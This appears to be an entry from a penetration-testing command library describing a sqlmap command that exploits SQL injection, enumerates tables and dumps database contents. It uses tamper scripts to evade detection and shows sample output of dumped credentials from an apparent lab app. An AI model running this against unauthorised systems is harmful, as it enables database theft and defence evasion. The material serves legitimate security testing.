---
type: command
executor: bash
data: sqlmap -u "$_URL" --tables --tamper=$_TAMPER --dump
output: null
platforms:
  - Linux
  - macOS
tags:
  - sql-injection
  - exploitation
verified: true
validated: true
---

# sqlmap-enumerate-tables-and-dump

## Command

```bash
sqlmap -u "$_URL" --tables --tamper=$_TAMPER --dump
```

## Description

This command uses sqlmap to detect and exploit SQL injection vulnerabilities in a target URL, enumerating database tables and dumping their contents. It includes a tamper script to evade basic detection, useful after gaining initial access via authentication flaws.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_URL | The target URL with the injectable parameter (e.g., http://127.0.0.1:8000/?fuzz=test) | Yes |
| $_TAMPER | Path to the tamper script for payload obfuscation (e.g., base64encode) | Yes |
| -u | Specifies the target URL | Built-in |
| --tables | Enumerates database tables | Built-in |
| --tamper | Applies the specified tamper script | Built-in |
| --dump | Dumps table contents | Built-in |

## Examples

### Basic Usage

```bash
sqlmap -u "http://127.0.0.1:8000/?fuzz=test" --tables --tamper=base64encode --dump
```

### Advanced Usage

```bash
sqlmap -u "http://target.com/api?param=1" --tables --tamper=space2comment --dump -D specific_db
```

## Expected Output

sqlmap will output injection detection details, then:

[INFO] fetching database names
available databases [3]:
[*] information_schema
[*] dvws
[*] mysql

Database: dvws
Table: users
[5 entries]+
+----+----------+----------+
| id | username | password |
+----+----------+----------+
| 1  | admin    | pass123  |
| 2  | user     | weakpass |
+----+----------+----------+

Data dumped to ./dump/dvws/users.csv

## Related

- [[procedures/Web-Sockets-Authentication-Exploitation]]
- [[tools/sqlmap]]
